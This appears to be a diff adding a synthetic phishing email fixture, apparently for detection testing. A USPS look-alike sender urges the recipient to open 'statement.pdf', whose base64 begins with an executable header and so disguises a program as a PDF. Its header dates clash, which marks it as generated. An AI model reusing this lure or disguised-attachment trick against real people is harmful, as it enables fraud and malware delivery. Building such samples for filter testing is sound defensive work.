@@ -1,0 +1,48 @@
+From: notice@usps-tracking.icu
+To: victim51@example.com
+Subject: Power outage maintenance window [ref A0DC3BF]
+Date: Tue, 02 Mar 2002 01:43:00 -0500
+Message-ID: <phish-111-2a0f714c-735a-4074-b66d-96cd760f5776@usps-tracking.icu>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 21 Mar 2002 01:57:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 09 Mar 2002 18:48:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 03 Mar 2002 13:42:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 03 Mar 2002 22:31:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 07 Mar 2002 19:23:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 17 Mar 2002 00:26:00 -0500
+Return-Path: <notice@usps-tracking.icu>
+Reply-To: notice@usps-tracking.icu
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=usps-tracking.icu; dkim=pass header.d=usps-tracking.icu; dmarc=pass header.from=usps-tracking.icu
+Received-SPF: pass (mx.example.com: domain of notice@usps-tracking.icu designates 192.0.2.51 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=usps-tracking.icu; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-111-873e9295"
+
+--bnd-p-111-873e9295
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: A0DC3BF
+
+Thanks,
+Colleague
+--bnd-p-111-873e9295
+Content-Type: application/pdf; name="statement.pdf"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="statement.pdf"
+
+TVqQACpoGlxAtrkfHe1AQLlwbYINPIcL7S1ob0I4s7UCkDtYWmKdDpFA9MC5Vu8S+7rYzDOaT92z
+qFBNrEVioaHEgvnFLOKnwOtZYF11iq6W7nnmR6E/QUuFtleMc1RYDclF66FT/YHTTp14FiiTGeg3
+p3C09iSTN1xBoHj/K53+y5ovhHUGC5PWIzcDZe3Ntiw3ds/Iq8BHUoHzB2tUTX5AayfVpKu6PtKi
+ST2QecPDM79jWCR8vdNpv6wm4QaPYai1KhDTdzLmIrroPQwE7suxblklqT2G5bX6MCYNuKFOTJnM
+a+0pNgMW/8s4g/eHOof1i2YU9CHI/aFkD/Sm0tCQw1de+sbbrev8XAFpSsM5Tw/0BSVSGo1Cf8Sq
+RNkS90in9nrevnQBgKjA4DU9a4HsFQ+iWmIF+7JXhMucMKsHmBMLKja+xDimzzPs2VvMhdwr+q8H
+GoNjgL5DVEn0lbHblkHNx6z36aT1NlvtNpNd1ICIKUZWQvEsoc9+A23tWxo8w6gOOs31WSkJWhJ3
+BAgpJcZqP7iB3KsJe9Ie+w/3gR0rPmOslaiUT/nWGKYPd374c55G5ZgK/YuGarg50N9kQqR7Nzpf
+fAZeAMpRPtHhPCTkTlyy/J+w9RDoWKBVSVBjtkbrnvUSbhg3hqKH6O5UtuKMfK1J98KqJLOUMhS/
+mvNF6L9AEtVdrJB20a8yJMnI7EFMksWWczRR4iCobCoECEnUXIhayjDbb+KFrW0pgb90DJ4f7XWC
+k1Z14qdi5eGRqU5235UIqwOJMYNoLk3lHotGVNGBTUqyWj54eQNiRmfVZgXGqGrFsZgjoaLF5sVy
+fqcTBYlFU546Dr3J4Q==
+
+--bnd-p-111-873e9295--
